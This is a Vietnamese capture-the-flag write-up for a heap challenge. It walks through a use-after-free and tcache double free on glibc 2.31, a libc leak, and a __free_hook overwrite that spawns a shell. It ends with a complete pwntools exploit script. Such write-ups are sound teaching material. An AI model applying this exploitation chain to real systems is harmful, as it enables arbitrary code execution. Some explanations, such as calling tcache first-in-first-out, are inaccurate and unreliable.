# chall 1

## source

```c
int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
{
  char v3; // [rsp+Fh] [rbp-11h] BYREF
  int v4; // [rsp+10h] [rbp-10h] BYREF
  _DWORD size[3]; // [rsp+14h] [rbp-Ch] BYREF

  *(_QWORD *)&size[1] = __readfsqword(0x28u);
  init(argc, argv, envp);
  puts("Ebook v1.0 - Beta version\n");
  while ( 1 )
  {
    while ( 1 )
    {
      while ( 1 )
      {
        menu();
        __isoc99_scanf("%d", &v4);
        __isoc99_scanf("%c", &v3);
        if ( v4 != 1 )
          break;
        printf("Size: ");
        __isoc99_scanf("%u", size);
        __isoc99_scanf("%c", &v3);
        ptr = malloc(size[0]);
        printf("Content: ");
        read(0, ptr, size[0]);
        *((_BYTE *)ptr + (unsigned int)(size[0] - 1)) = 0;
      }
      if ( v4 == 2 )
        break;
      switch ( v4 )
      {
        case 3:
          if ( ptr )
          {
            free(ptr);
            puts("Done!");
          }
          else
          {
LABEL_15:
            puts("You didn't buy any book");
          }
          break;
        case 4:
          if ( !ptr )
            goto LABEL_15;
          printf("Content: %s\n", (const char *)ptr);
          break;
        case 5:
          exit(0);
        default:
          puts("Invalid choice!");
          break;
      }
    }
    if ( !ptr )
      goto LABEL_15;
    printf("Content: ");
    read(0, ptr, size[0]);
    *((_BYTE *)ptr + (unsigned int)(size[0] - 1)) = 0;
  }
}
```

## Ý tưởng

- Ở đây file 2.31 có safe linking để ngăn chặn DFB [xem rõ hơn cơ chế hoạt động của safe linking ở đây](https://github.com/wan-hyhty/trainning/blob/b%C3%A1o-c%C3%A1o/b%C3%A1o%20c%C3%A1o%20l%E1%BA%A7n%203/heap-exploitation.md#libc-231)
- Đầu tiên ta sẽ thay đổi fd và bk bằng UAF để có thể double free nhưng safe linking không nhận ra
- Tiếp theo ta leak địa chỉ libc và ow \_hook

## Thực thi

- Bài này em có tham khảo wu a Quý =))

- Đầu tiên ta cần tạo một chunk với size tuỳ ý và free nó

```python
sla(b"> ", b"1")
sla(b"Size: ", str(0x20))
sa(b"Content: ", str(0x20))
sla(b"> ", b"3")
```

- Ta kiểm tra chunk
  ![image](https://user-images.githubusercontent.com/111769169/234796684-99ab6f13-f936-4386-becb-f5d9317fd120.png)
- Đúng với lí thuyết, bk của chunk ta tạo sẽ là địa chỉ của chunk trước đó. Safe linking sẽ dựa vào bk để ngăn chặn DFB

- Đến đấy ta khai thác lỗi UAF ở option 2 để sửa bk chunk đã free và free chunk lần nữa

```python
sla(b"> ", b"2")
sa(b"Content: ", b"\0" * 0x20)
sla(b"> ", b"3")
```

![image](https://user-images.githubusercontent.com/111769169/234798303-7344d34b-0df0-4857-9264-0820d9ed108b.png)

- Tiếp đến ta leak libc
- Ở đây, khi ta double free thì fd bị loop như sau
  ![image](https://user-images.githubusercontent.com/111769169/234837508-bfcec32a-5fc6-47b3-aba1-ce5d7866a48a.png)
- Ta hoàn toàn có thể can thiệp vào vị trí của chunk bị loop kia bằng cáp thay đổi fd
- fd sẽ là địa chỉ của chunk sau nên nếu ta trỏ fd là địa chỉ của một got thì khi trỏ đến got nó sẽ lấy địa chỉ plt để leak libc
- Có thể do tcache là danh sách liên kết đơn, nghĩa là có fd và bk, và fd của chunk trước có thể là giá trị bk của chunk sau

```python
sla(b"> ", b"2")
sa(b"Content: ", p64(exe.sym["stderr"]))
```

![image](https://user-images.githubusercontent.com/111769169/234839401-fca0481e-befc-4b3a-97d7-2a152c75b276.png)

- Tcache hơi giống stack một tí nhưng khác nhau ở chỗ, stack là vào cuối- ra đầu, còn tcache là vào đầu - ra đầu (trong tcache, các chunk được đưa vào và lấy ra bằng cách sử dụng con trỏ forward)
- Vậy nghĩa là ta đang có 2 chunk, một chunk là đang trỏ ở heap, chunk còn lại đã bị thay đổi fd đang trỏ vào got của free mà ptr lại là địa chỉ của chunk nên ta phải gọi lại 2 lần thì ptr mới là địa chỉ của chunk 2(got của free)

- Tính libc base

```python
sla(b"> ", b"1")
sla(b"Size: ", str(0x20))
sa(b"Content: ", b"abcde")

sla(b"> ", b"1")
sla(b"Size: ", str(0x20))
sa(b"Content: ", b"\xc0")
sla(b"> ", b"4")
p.recvuntil(b"Content: ")

libc_leak = u64(p.recv(6) + b"\0\0")
libc.address = libc_leak - libc.sym['_IO_2_1_stderr_']
info(hex(libc_leak))
info(hex(libc.address))
```

- Tiếp tục double free và use after free để ghi /bin/sh vào \_\_free_hook

```python
sla(b"> ", b"1")
sla(b"Size: ", str(0x20))
sa(b"Content: ", str(0x20))
sla(b"> ", b"3")

sla(b"> ", b"2")
sa(b"Content: ", b"\0" * 16)
sla(b"> ", b"3")

sla(b"> ", b"2")
sa(b"Content: ", p64(libc.sym['__free_hook']))
```

- Giống như trước đó nhưng ở đây hơi khác
- Khi ta malloc lần thứ 2 thì ptr đang trỏ chứa `__free_hook` đang trỏ đến chuỗi ta vừa nhập, qua option 2 ta sẽ ghi vào `__free_hook`

![image](https://user-images.githubusercontent.com/111769169/234880535-47928d4c-3add-4261-8d2f-a933a7f6b9d2.png)

```python
sla(b"> ", b"1")
sla(b"Size: ", str(0x20))
sa(b"Content: ", str(0x20))

sla(b"> ", b"1")
sla(b"Size: ", str(0x20))
sa(b"Content: ", b"aaa")

sla(b"> ", b"2")
sa(b"Content: ", p64(libc.sym['system']))
```

- `__free_hook` được thiết lập, thì hàm free() sẽ trước tiên kiểm tra xem **free_hook có khác NULL hay không. Nếu **free_hook khác NULL, thay vì thực hiện việc giải phóng chunk trên heap, hàm free() sẽ gọi hàm được chỉ định bởi \_\_free_hook để xử lý việc giải phóng chunk
- Khi này, ta free() (option 3) thì free() thay vì giải phóng mà thực hiện hàm `__free_hook` chỉ định
```python
sla(b"> ", b"1")
sla(b"Size: ", str(0x20))
sa(b"Content: ", b"/bin/sh\0")
sla(b"> ", b"3")
```
## Kết quả 
```python

sla(b"> ", b"1")
sla(b"Size: ", str(0x20))
sa(b"Content: ", b"/bin/sh\0")
sla(b"> ", b"3")
```

```python
#!/usr/bin/python3

from pwn import *

exe = ELF('./chall1_patched', checksec=False)
libc = ELF('./libc-2.31.so')
context.binary = exe


def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
                c
                ''')


def info(msg): return log.info(msg)
def sla(msg, data): return p.sendlineafter(msg, data)
def sa(msg, data): return p.sendafter(msg, data)
def sl(data): return p.sendline(data)
def s(data): return p.send(data)


if args.REMOTE:
    p = remote('')
else:
    p = process(exe.path)

GDB()
sla(b"> ", b"1")
sla(b"Size: ", str(0x20))
sa(b"Content: ", str(0x20))
sla(b"> ", b"3")

sla(b"> ", b"2")
sa(b"Content: ", b"\0" * 0x20)
sla(b"> ", b"3")

sla(b"> ", b"2")
sa(b"Content: ", p64(exe.sym["stderr"]))

sla(b"> ", b"1")
sla(b"Size: ", str(0x20))
sa(b"Content: ", b"abcde")

sla(b"> ", b"1")
sla(b"Size: ", str(0x20))
sa(b"Content: ", b"\xc0")
sla(b"> ", b"4")
p.recvuntil(b"Content: ")

libc_leak = u64(p.recv(6) + b"\0\0")
libc.address = libc_leak - libc.sym['_IO_2_1_stderr_']
info(hex(libc_leak))
info(hex(libc.address))

sla(b"> ", b"1")
sla(b"Size: ", str(0x20))
sa(b"Content: ", str(0x20))
sla(b"> ", b"3")

sla(b"> ", b"2")
sa(b"Content: ", b"\0" * 16)
sla(b"> ", b"3")

sla(b"> ", b"2")
sa(b"Content: ", p64(libc.sym['__free_hook']))

sla(b"> ", b"1")
sla(b"Size: ", str(0x20))
sa(b"Content: ", str(0x20))

sla(b"> ", b"1")
sla(b"Size: ", str(0x20))
sa(b"Content: ", b"aaa")

sla(b"> ", b"2")
sa(b"Content: ", p64(libc.sym['system']))

sla(b"> ", b"1")
sla(b"Size: ", str(0x20))
sa(b"Content: ", b"/bin/sh\0")
sla(b"> ", b"3")

p.interactive()

```
